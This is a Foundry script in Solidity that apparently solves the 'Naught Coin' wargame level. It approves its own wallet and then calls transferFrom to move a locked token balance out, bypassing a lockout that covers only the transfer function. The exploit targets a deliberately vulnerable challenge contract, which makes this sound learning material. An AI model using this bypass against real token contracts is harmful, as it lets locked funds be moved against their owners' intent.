// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/Naught_coin.sol";
import {Attack} from "../src/Attack.sol";
import {DeployScript} from "../script/DeployScript.s.sol";

contract AttackScript is Script {

    NaughtCoin naughtCoin = NaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);

    function run() external{
        vm.startBroadcast();
        address myWallet = 0x5134FCA2Ce708AEf8672ffB6561288ee81E30543;


        uint myBal = naughtCoin.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);

        naughtCoin.approve(myWallet, myBal);
        naughtCoin.transferFrom(myWallet, address(naughtCoin), myBal);

        console.log("New balance is: ", naughtCoin.balanceOf(myWallet));
        vm.stopBroadcast();
    }
}

